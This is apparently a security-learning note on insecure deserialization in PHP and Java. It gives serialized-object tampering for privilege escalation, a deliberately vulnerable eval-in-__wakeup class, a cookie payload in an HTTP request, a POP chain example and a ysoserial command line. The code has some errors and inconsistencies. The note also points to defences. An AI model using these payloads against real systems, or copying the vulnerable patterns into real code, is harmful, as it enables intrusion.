
They're hard to find, because they're pretty much depended on the backend programming language/framework. Also you have to be pretty advanced in technical knowledge of the programming language or framework. But also deserialization can be present pretty much anywhere, but it's not a popular bug in reports due to the fact that you can not automate finding it easily. There are numerous research papers on how hackers used insecure deserialization to gain [[TurtleBB/Dictionary/RCE]] on key resources of brands even as big as Google or Facebook.

Most commonly found in PHP and Java (<3)

### **Mechanisms**
**Serialization** is a process in which data written in specific programming language is converted into a format that is enabling it to be stored in database or send via network. 
**Deserialization** on the other hand is a process in which program reads serialized object from file or network and parses it back into an object.

Its useful because some objects are notoriously hard to store without damaging them. Serialization and deserialization helps languages to reconstruct identical objects in different computing environments. 

Programmers often trust serialization because its hard to read or even unreadable for the users. This trust can be abused by attackers. Insecure deserialization is present when attacker can manipulate serialized object to make unintended behavior in the program. Sometimes it can even lead to bypassing authorization and gaining [[TurtleBB/Dictionary/RCE]]. If application gets serialized object from uses data from it to tell, who is logged in, threat actor can manipulate this object to authorize as someone else. Sometimes if object isn't deserialized properly, threat actor can try to put fragments of code into object and execute it during deserialization

Most of insecure deserialization vulnerabilities are triaged as critical by hackerone. Viva insecure deserialization!
### **In PHP**
Mainly insecure deserialization happens in Java, but it is also commonly present in PHP. In PHP insecure deserialization is also known as **PHP object injection vulnerability**. To understand how its done you have to first understand how PHP proceeds with serialization and deserialization of objects. 

When application has to save or send object PHP uses function serialize() to pack up an object. If the application must use this data it uses unserialize() function to unpack data and download the object.
```
<?php
class User{
public $username;
public $status;
}
$user = new User;
$user->username = 'vickie';
$user->status = 'not admin';
echo serialize($user);
?>
```
This is how the serialized user looks like:
``0:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
Let's analyze this String. Basic structure of the serialize String in PHP is type_of_data:data;. Types of data are represented by corresponding chars: b boolean, i integer, d floatpoint, s string, a array, 0 is an instance of an object.
```
b:boolean;
i:integer;
d:floatpoint
s:length_of_string:string
a:number_of_elements:{elements}
0:name_length:"name_of_class":number_of_fields:{fields}
```
Based on above information we can tell that our serialized String is an object of a user class. It has two attributes. First is username which is 'vickie' and  second is status which is 'not an admin'.
```
<?php
	class User{
	public $username;
	public $status;
	}
$user = new User;
$user->username = 'vickie';
$user->status = 'not admin';
$serialized_string =  serialize($user);

$unserialized_data = unserialize($serialized_string)l
var_dump($unserialized_data);
var_dump($unserialized_data["status"])
?>
```
Thats how deserialization works. var_dump just prints out data.

So if you have above room temperature iQ you can probably see something shady here. If serialized object isn't hashed or signed everyone can make User object. One way of exploitation of PHP object injection is to manipulate data of fields. Some programmers believe that serializing object is enough of a security measure to prevent user from manipulating data. In this case you can manipulate values just by intercepting request with proxy and for example changing: 
``0:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}  
to 
``0:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:5:"admin";}
Sometimes it works and it baffles author of the book.

#### **Deserialization**
To understand how it can lead to RCE you must first how objects are created and destroyed in php.
Magical method of PHP are the name of PHP methods that are containing special properties. If the serialized class of an object implements any magical method in the their name, this method will have magical properties like automatically being executed under certain conditions. Two of the magic methods are _wakeup() and _destruct().

_"_wakerup()"_ method is used when application makes object of the class, which is the main functionality of the unserialize() function, which uses serialized String  to retrieve the name of class and tries to make object of that class with attributes from that String. Next it looks for the _wakeup()_ method of the class and executes code in it. This method is executed to reinitialize every connection that object had (for example with database). It is used often when trying to do PHP Object Injection because it makes it much easier to access database or other methods in the program. If there are no more references to that object program runs _"_destruct()"_ on it. If this method contains code which deletes and cleans files connected to object, attacker can destroy integrity of files.

### **RCE**
When you control serialized object which is used in unserialize() function, you control attributes of created object. You can control values parsed automatically to executed methods like wakeup or destruct. In this case you can achieve RCE. For example:
```
class Example2
{
   private $hook;
   function __construct()
   {
      // some PHP code...
   }
   function __wakeup()
   {
      if (isset($this->hook)) eval($this->hook);
   }
}
// some PHP code...
$user_data = unserialize($_COOKIE['data']);
// some PHP code...
```
Here you can achieve RCE because code which is parsed to unserialize() is received from user and Example 2 uses magic method, which automatically uses eval() on data given by an user.

If you want to exploit this RCE you have to set cookie data to a serialized object of Example2 and for an hook attribute you should give any PHP code, which you want to execute. This serialized object you can generate by using this code fragment:
```
class Example
{
private $hook = "phpinfo();";
}
print urlencode(serialize(new Example2));
```
and now you can use generated serialized object in curl looking like this:
```
GET /vuln.php HTTP/1.0
Host: testsite.com
Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
Connection: close
```
What happens?
1. Serialized object example2 is parsed to program as a cookie data
2. Program makes unserialize on cookie data file
3. Because file cookie data is serialized object of Example2, function unserialize() creates new instance of an object Example2
4. Function unserilize() detects that Example2 has implemented wakeup method so it activates it
5. wakeup() method searches for $hook attribute of an object and if the attribut is null it executes eval($hook)
6. Attribute $hook isn't null, because it has signed value of phpinfo(); so we execute code eval("phpinfo();").
7. RCE is achieved.


##### There are actually 4 magic methods
wakeup(), destruct(), toString(), call().

toString() is used when object is treated as a String so it can be for example printed out.

call() is used when called method is undefined. For example if $object->call('undefined', $args) it will become $object->('undefined', $args)

#### **Using POP chains**
Above exploits sometimes work. With this approach there is one problem. If the magic methods of the class don't call any methods useful during exploitation? Sometimes classes that are prune to injections contain only few methods, which have none that allow us for further exploitation.

We have one more way of exploiting things. We can use POP Strings (Property-Oriented Programming). It is a kind of an exploit which name comes from the fact that ttacker controls all attributes of deserialized object. POP chains work through connecting fragments of codes called gadgets. Thanks to this attackers can achieve RCE. POP chains use magical methods as their basic gadget. Attacker can then use these methods to call another gadgets. 

Let's see what it really means.
```
class Example1
{
   public $cache_file;
   function __construct()
   {
      // some PHP code...
   }
   function __destruct()
   {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}
// some PHP code...
$user_data = unserialize($_POST['data']);
// some PHP code...
```
In this application code defines two classes: Example and CodeSnippet.
The code also receives data from POST parameters and deserializes it.

Below code can be user to generate PHP Object injection payload
```
class CodeSnippet
{
   private $code = "phpinfo();";
}
class Example
{
   private $obj;
   function __construct()
   {
      $this->obj = new CodeSnippet;
   }
}
print urlencode(serialize(new Example));
```
What this block of code does is the following:
1. Define a class named CodeSnippet, and set its code property to “phpinfo();”.
2. Define a class named Example, and set its obj property to a new instance to a new CodeSnippet instance on instantiation.
3. Create an Example instance, serialize and URL encode the serialized string.
The attacker can then feed the generated string into the POST parameter data, and this is what the program would do:
1. Unserialize the object, create an Example instance.
2. Call wakeup(), see that the obj property is set to a CodeSnippet instance.
3. Call the evaluate() method of the obj, which runs eval(“phpinfo();”).
This is how an attacker can achieve RCE by chaining and reusing code found in the application’s codebase.

As you can imagine you have to either guess what classes implement the magic methods and use methods that can be abused or you have to have access to the source code in order to exploit it properly without guessing.

POP chains are similar to ROP attacks, which are technique used in binary exploitation.

#### **In Java**
It works pretty much the same, but there are some key differences.
Serialized Java objects are not human readable. They often contain non-printable characters. But they have some signatures which can help recognize them and make potential exploits possible.
* Object begin with AC ED 00 05 in hexadecimal or r00 in base64.
* There is a header Content-Type with application/x-java-serialized-object value.
Java objects are also encoded because of theis special characters. 
Because finding and making POP chains is time-consuming and you can use only classes available for application you can try to use gadgets from popular libraries such as Apache Common-Collections, Spring Framework etc.

#### **Automation of Java Exploitation**
You can try to use Ysoserial (https://github.com/frohoff/ysoserial). It is a tool which you can use to generate payloads which exploit vulnerability of insecure deserialization in Java. By doing that you will save a lot of time, because you won't have to think which gadgets to connect.
``java -jar ysoserial.jar gadget_chain command_to_execute
``java -jar ysoserial.jar CommonsCollections1 calc.exe

### **To fight against this exploit**
It is hard to defend against it. It really depends on framework and language used. Remember to never deserialize user inputted data unless its necessary.
Here is cheat shit to implementing proper deserialization for every popular language:
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html

### **To find insecure deserialization**
Best way to find it is to look for deserialization in source code. If there is deserialization in source code you should try to tell if the user input is put there without any thinking. Methods to look for:
unserialize(), readObject(), pickle.loads(), Marshall.load()

To find it in wild without source code you should probably look for parameters of http forms, input to data bases, authentication token etc. After that you should look in requests for big blobs of data. Weird long Strings that don't resemble nothing, but are big enough so that they could potentially contain serialized object. Then you should try to decode that String. 

Also remember that in Java serialization:
* Object begin with AC ED 00 05 in hexadecimal or r00 in base64.
* There is a header Content-Type with application/x-java-serialized-object value.

Next you should try to manipulate object by using one of techniques which are written above. If application uses object serialization as a way of authentication you can change fields to see if you can log in as other users.

### **Escalation**
Insecure Deserialization can easily lead to RCE. If not they also allow for bypassing authenticators and other important security measures. 

Sometimes Insecure Deserialization may lead to dangerous and malicious effects even when we don't want to. So reassure yourself that your code manipulation won't impact on the integrity of the target system.